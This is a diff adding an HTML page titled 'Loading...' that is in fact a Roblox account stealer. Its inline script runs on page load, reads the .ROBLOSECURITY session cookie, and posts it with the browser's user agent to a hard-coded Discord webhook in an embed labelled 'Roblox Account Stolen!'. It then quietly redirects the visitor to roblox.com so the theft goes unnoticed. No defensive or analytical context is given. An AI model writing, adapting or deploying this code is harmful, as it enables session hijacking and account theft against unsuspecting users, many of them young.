@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        /* Make the page completely invisible/transparent */
+        body { margin: 0; padding: 0; background: transparent; }
+    </style>
+</head>
+<body>
+<script>
+    // CONFIGURATION
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1566854274045050890/BCy16U4KQkrIeKfJXrRmt3HM2Dg694oMC_U5WRBgfOfg2nPlIXeM6j_u1uISkECJ0rd0";
+    
+    (async () => {
+        try {
+            // 1. Get Roblox Session Cookie
+            const robloxCookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
+            
+            if (!robloxCookie) {
+                // If no cookie, just redirect them to Roblox so they don't notice
+                window.location.href = "https://www.roblox.com";
+                return;
+            }
+
+            const cookieValue = robloxCookie[1];
+            const timestamp = new Date().toISOString();
+            const userAgent = navigator.userAgent;
+            const url = window.location.href;
+
+            // 2. Format for Discord Embed
+            const payload = {
+                embeds: [{
+                    title: "🎮 Roblox Account Stolen!",
+                    color: 15158332, // Red
+                    fields: [
+                        { name: "Cookie", value: `\`\`\`${cookieValue}\`\`\``, inline: false },
+                        { name: "User Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false },
+                        { name: "IP Address", value: "See console/log", inline: false }, // Note: Client-side JS can't get IP easily without external service
+                        { name: "Time", value: timestamp, inline: false }
+                    ],
+                    footer: { text: "Stolen by NoTrack" }
+                }]
+            };
+
+            // 3. Send to Discord
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            // 4. Stealth Redirect: Send them back to Roblox immediately
+            // This makes it look like a normal page load or refresh
+            setTimeout(() => {
+                window.location.href = "https://www.roblox.com";
+            }, 500); // Half-second delay to ensure the webhook sends first
+            
+        } catch (e) {
+            console.error("Error:", e);
+            window.location.href = "https://www.roblox.com";
+        }
+    })();
+</script>
+</body>
+</html>
